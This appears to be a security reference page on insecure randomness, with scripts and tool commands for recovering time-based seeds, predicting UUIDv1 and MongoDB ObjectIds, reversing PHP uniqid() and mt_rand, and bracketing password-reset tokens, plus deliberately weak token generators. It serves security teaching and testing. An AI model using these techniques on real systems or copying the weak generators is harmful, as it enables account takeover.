# Insecure Randomness

Insecure randomness vulnerabilities arise when applications use predictable or reconstructable sources of randomness for security-critical values — password reset tokens, session IDs, API keys, or object identifiers. If an attacker can predict or enumerate these values, they can hijack accounts, bypass authentication, or forge requests.

## Time-Based Seeds

Many RNGs are seeded with the current system time (milliseconds since epoch). Because the seed is derivable from the approximate timestamp of a request, an attacker can regenerate the exact random value.

### Vulnerable Pattern

```
import random
import time

seed = int(time.time())
random.seed(seed)
print(random.randint(1, 100))
```

### Exploitation — Seed Recovery by Known Timestamp

```
import random
import time

# Attacker knows approximate time of token generation
seed = int(time.mktime(time.strptime('2024-11-10 13:37', '%Y-%m-%d %H:%M')))
random.seed(seed)

# Reproduce the same random value
print(random.randint(1, 100))
```

## GUID / UUID Version Analysis

GUIDs/UUIDs follow the format `xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx` where `M` indicates the version. Only version 4 is truly random; others are predictable or partially predictable.

| Version | Generation Method | Predictable? |
| --- | --- | --- |
| 0 | Null UUID only | Yes |
| 1 | Timestamp + clock sequence + MAC address | Yes — timestamp and MAC recoverable |
| 2 | Reserved (DCE) | Rarely implemented |
| 3 | MD5 hash of namespace + name | Predictable if name is known |
| 4 | Random | No (if CSPRNG used) |
| 5 | SHA-1 hash of namespace + name | Predictable if name is known |

### Attacking Version 1 UUIDs with guidtool

```
# Inspect a UUIDv1 to extract timestamp, MAC, and clock sequence
guidtool -i 95f6e264-bb00-11ec-8833-00155d01ef00

# Output:
# UUID version: 1
# UUID time: 2022-04-13 08:06:13.202186
# UUID timestamp: 138691299732021860
# UUID node: 91754721024
# UUID MAC address: 00:15:5d:01:ef:00
# UUID clock sequence: 2099

# Predict other UUIDs generated around a known time (-t) with brute window (-p)
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
```

## MongoDB ObjectId Prediction

MongoDB ObjectIds are 12 bytes with a predictable structure:

- Bytes 0-3: Unix timestamp (seconds)
- Bytes 4-6: Machine identifier (hostname/IP-derived)
- Bytes 7-8: Process ID
- Bytes 9-11: Counter (incremented sequentially)

If you know one ObjectId, you can predict nearby IDs generated by the same process (IDOR via ObjectId enumeration).

### Predict ObjectIds with mongo-objectid-predict

```
./mongo-objectid-predict 5ae9b90a2c144b9def01ec37
5ae9bac82c144b9def01ec39
5ae9bacf2c144b9def01ec3a
5ae9bada2c144b9def01ec3b
```

### Python: Decode an ObjectId

```
def MongoDB_ObjectID(timestamp, process, counter):
    return "%08x%10x%06x" % (timestamp, process, counter)

def reverse_MongoDB_ObjectID(token):
    timestamp = int(token[0:8], 16)
    process = int(token[8:18], 16)
    counter = int(token[18:24], 16)
    return timestamp, process, counter

tokens = ["5ae9b90a2c144b9def01ec37", "5ae9bac82c144b9def01ec39"]
for token in tokens:
    (timestamp, process, counter) = reverse_MongoDB_ObjectID(token)
    print(f"{token}: {timestamp} - {process} - {counter}")
```

## PHP uniqid() Reversal

`uniqid()` generates a token from the current Unix timestamp with microsecond precision. Tokens are hex-encoded time values and can be reversed to extract the exact generation time.

Token examples: `6659cea087cd6`, `6659cea087cea`

```
import math
import datetime

def uniqid(timestamp: float) -> str:
    sec = math.floor(timestamp)
    usec = round(1000000 * (timestamp - sec))
    return "%8x%05x" % (sec, usec)

def reverse_uniqid(value: str) -> float:
    sec = int(value[:8], 16)
    usec = int(value[8:], 16)
    return float(f"{sec}.{usec}")

tokens = ["6659cea087cd6", "6659cea087cea"]
for token in tokens:
    t = float(reverse_uniqid(token))
    d = datetime.datetime.fromtimestamp(t)
    print(f"{token} - {t} => {d}")
```

## PHP mt_rand() Seed Recovery

PHP's `mt_rand()` uses the Mersenne Twister PRNG. With only two output values, the seed can be recovered without bruteforce using the ambionics tool:

```
# Generate two mt_rand outputs from seed 12345678 with constraints 1..123
./display_mt_rand.php 12345678 123
# Output: 712530069 674417379

# Recover the seed from the two outputs
./reverse_mt_rand.py 712530069 674417379 123 1
```

## Custom Insecure Algorithms

Hand-rolled token generation schemes found in production code are frequently vulnerable:

```
# MD5 of email + weak rand — predictable with known email
$token = md5($emailId).rand(10,9999);

# MD5 of time — recoverable with timestamp
$token = md5(time()+123456789 % rand(4000, 55000000));
```

### Sandwich Attack with Reset Tolkien

The sandwich attack brackets a victim's token between two attacker-controlled tokens to determine the exact generation timestamp:

```
# Detect the token format and timezone
reset-tolkien detect 660430516ffcf -d "Wed, 27 Mar 2024 14:42:25 GMT" \
  --prefixes "attacker@example.com" --suffixes "attacker@example.com" --timezone "-7"

# Perform the sandwich attack on a known time window
reset-tolkien sandwich 660430516ffcf -bt 1711550546.485597 -et 1711550546.505134 \
  -o output.txt --token-format="uniqid"
```
